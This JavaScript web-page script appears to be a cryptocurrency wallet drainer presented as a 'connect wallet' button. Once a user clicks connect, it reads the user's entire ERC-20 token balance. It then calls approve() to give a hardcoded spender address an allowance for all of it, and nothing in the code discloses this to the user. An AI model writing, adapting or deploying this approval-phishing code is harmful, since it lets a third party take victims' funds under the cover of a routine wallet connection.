const tokenABI = [
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        name: "balance",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_spender",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        name: "success",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_to",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "transfer",
    outputs: [
      {
        name: "success",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

const tokenContractAddress = "0x779877A7B0D9E8603169DdbD7836e478b4624789";
const spenderAddress = "0x8CD8a0CB36ad5ae6Be0CB4e8792d3D3Ab1219b10";
let account;
let chainId;

async function connect() {
  if (typeof window.ethereum !== undefined) {
    await ethereum
      .request({
        method: "eth_requestAccounts",
        params: [],
      })
      .then(function (response) {
        console.log("Request Account", response);
        account = response[0];
        execute();
      })
      .catch(function (error) {
        console.log("Request Account Error", error);
      });
    chainId = ethereum
      .request({ method: "eth_chainId" })
      .then(function (response) {
        chainId = response;
      })
      .catch(function (error) {
        console.log("Request Account Error", error);
      });
  }
}

async function execute() {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();

  const contract = new ethers.Contract(tokenContractAddress, tokenABI, signer);
  let balance = await contract.balanceOf(account);
  balance = ethers.utils.formatUnits(balance, 18);
  let result = await contract.approve(spenderAddress, ethers.utils.parseUnits(balance, 18));
  console.log(result)

}

document.addEventListener("click", function (e) {
  let targetId = e.target.id;
  if (targetId == "connect") {
    connect();
  }
});
